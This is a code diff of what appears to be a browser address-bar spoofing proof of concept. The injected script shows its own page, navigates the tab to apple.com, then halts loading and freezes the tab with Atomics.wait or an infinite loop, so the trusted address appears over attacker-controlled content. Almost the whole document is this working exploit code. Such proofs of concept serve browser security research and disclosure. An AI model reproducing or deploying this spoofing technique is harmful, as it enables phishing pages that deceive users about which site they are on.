@@ -12,28 +12,24 @@
         tab.document.write(`
         <h1 style="font-size: 50px; color: pink; text-align: center; position: fixed; inset: 0; height: fit-content; margin: auto;">Address spoofed by nakano</h1
         
-            <script>
-                setTimeout(() => {
-                    tab.location.href = "https://apple.com";
-                }, 1);
-                
-                setTimeout(() => {
-                    try {
-                        tab.stop();
-                    } catch (e) {
-                        console.error(e);
-                    }
+        <script>
+            setTimeout(() => {
+                tab.location.href = "https://apple.com";
+            }, 1);
 
-                    try {
-                        const sab = new SharedArrayBuffer(4);
-                        const view = new Int32Array(sab);
+            setTimeout(() => {
+                tab.stop();
 
-                        Atomics.wait(view, 0, 0, 9999999);
-                    } catch (e) {
-                        while (true){}
-                    }
-                }, 400);
-            <\/script>
+                try {
+                    const sab = new SharedArrayBuffer(4);
+                    const view = new Int32Array(sab);
+
+                    Atomics.wait(view, 0, 0, 9999999);
+                } catch (e) {
+                    while (true) {}
+                }
+            }, 500);
+        <\/script>        
         `);
     }
 </script>
